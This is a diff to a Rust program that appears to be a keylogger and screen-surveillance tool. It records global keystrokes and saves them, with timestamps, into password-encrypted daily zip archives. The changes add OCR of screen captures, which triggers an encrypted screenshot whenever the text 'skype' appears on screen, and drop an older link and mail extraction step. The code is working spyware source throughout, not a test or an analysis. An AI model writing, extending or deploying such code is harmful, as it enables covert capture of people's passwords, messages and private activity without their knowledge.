@@ -15,8 +15,9 @@ use std::str;
 use chrono::{Utc, DateTime};
 use linkify::{LinkFinder, LinkKind};
 use image::io::Reader as ImageReader;
-use image::DynamicImage;
+use image::{DynamicImage, ImageBuffer};
 use rusty_tesseract::{Args, Image};
+use regex::RegexBuilder;
 use monitor::*;
 
 const TEMP: &str = "data.dat";
@@ -112,7 +113,7 @@ fn main() {
                         lang: "eng".into(),
                         config_variables: HashMap::from([(
                             "tessedit_char_whitelist".into(),
-                            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$./ ".into(),
+                            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$./ ?,".into(),
                         )]),
                         dpi: Some(150),
                         psm: Some(6),
@@ -121,6 +122,18 @@ fn main() {
 
                     let output = rusty_tesseract::image_to_string(&img, &image_to_string_args).unwrap();
                     println!("\nThe String output is: {}", output);
+
+                    let re =
+                        RegexBuilder::new(&regex::escape("skype"))
+                        .case_insensitive(true)
+                        .build().unwrap();
+
+                    let ok = re.is_match(&output);
+
+                    if ok {
+                        println!("Great works!!!");
+                        doscreenshots(&dynamic_image);
+                    }
                 }
             }
             Events::Exit => {
@@ -200,9 +213,6 @@ fn track_activity(event: Event) {
         EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
         EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
         EventType::KeyPress(Key::Return) => {
-            let zipped_logs1: String = readlogs("log1.txt");
-            let zipped_logs2: String = readlogs("log2.txt");
-
             let now = Utc::now();
             let x: String = format!("{}", now);
             let now_parsed: DateTime<Utc> = x.parse().unwrap();
@@ -215,10 +225,9 @@ fn track_activity(event: Event) {
             let mut data = String::new();
             fileRead.read_to_string(&mut data);
 
-            let logs1 = zipped_logs1 + &data + "\n" + &now_parsed.to_string() + "\n";
-            let logs2 = zipped_logs2 + &links(data.clone());
+            let logs = now_parsed.to_string() + "     " + &data + "\n";
 
-            zip_main(logs1, logs2);
+            zip_main(logs);
 
             let mut fileClear = OpenOptions::new()
                 .write(true)
@@ -242,8 +251,8 @@ fn track_activity(event: Event) {
     }
 }
 
-fn zip_main(logs: String, mails: String) -> i32 {
-    match dozip(logs, mails) {
+fn zip_main(logs: String) -> i32 {
+    match dologs(logs) {
         Ok(_) => println!("Zipped successfuly."),
         Err(e) => println!("Failed to zip.: {e:?}"),
     }
@@ -251,48 +260,58 @@ fn zip_main(logs: String, mails: String) -> i32 {
     0
 }
 
-fn dozip(logs: String, mails: String) -> ZipResult<()> {
+fn dologs(logs: String) -> ZipResult<()> {
     let now: DateTime<Utc> = Utc::now();
-    let fname = format!("{}.zip", now.format("%Y-%m-%d").to_string());
+    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
 
     let path = std::path::Path::new(&fname);
     let file = std::fs::File::create(path).unwrap();
 
     let mut zip = ZipWriter::new(file);
 
-    zip.add_directory("text/", Default::default())?;
+    let options = FileOptions::default()
+        .compression_method(CompressionMethod::Stored)
+        .unix_permissions(0o755)
+        .with_deprecated_encryption(PASS);
+
+    zip.start_file("log.txt", options);
+    zip.write(logs.as_bytes());
+    zip.finish();
+
+    Ok(())
+}
+
+fn doscreenshots(image: &DynamicImage) -> ZipResult<()> {
+    let now: DateTime<Utc> = Utc::now();
+    let fname = format!("S{}.zip", now.format("%Y-%m-%d").to_string());
+
+    let path = std::path::Path::new(&fname);
+    let file = std::fs::File::create(path).unwrap();
+
+    let mut zip = ZipWriter::new(file);
 
     let options = FileOptions::default()
         .compression_method(CompressionMethod::Stored)
         .unix_permissions(0o755)
         .with_deprecated_encryption(PASS);
-    zip.start_file("text/hello.txt", options)?;
-    zip.write_all(b"Hello, World!\n")?;
 
-    zip.start_file("text/log1.txt", options)?;
-    zip.write_all(logs.as_bytes())?;
-
-    if !mails.is_empty() {
-        zip.start_file("text/log2.txt", options)?;
-        zip.write_all(mails.as_bytes())?;
-    }
+    zip.start_file(now.format("%Y-%m-%d-%H:%M:%S.png").to_string(), options)?;
+    zip.write_all(image.as_bytes())?;
 
     zip.finish()?;
     Ok(())
 }
 
 fn readlogs(filename: &str) -> String {
-    let lname = format!("text/{}", filename);
-
     let now: DateTime<Utc> = Utc::now();
-    let fname = format!("{}.zip", now.format("%Y-%m-%d").to_string());
+    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
     let file = match fs::File::open(fname) {
         Ok(file) => file,
         Err(err) => {
             let x: String = format!("{}", now);
             let now_parsed: DateTime<Utc> = x.parse().unwrap();
 
-            dozip(String::from(""), now_parsed.to_string());
+            dologs(String::from(""));
             return String::from("");
         }
     };
@@ -301,7 +320,7 @@ fn readlogs(filename: &str) -> String {
 
     let mut archive = ZipArchive::new(reader).unwrap();
 
-    let mut file = match archive.by_name_decrypt(&lname, PASS) {
+    let mut file = match archive.by_name_decrypt(&filename, PASS) {
         Ok(file) => file.unwrap(),
         Err(..) => {
             println!("File text/{} not found in the zip.", filename);
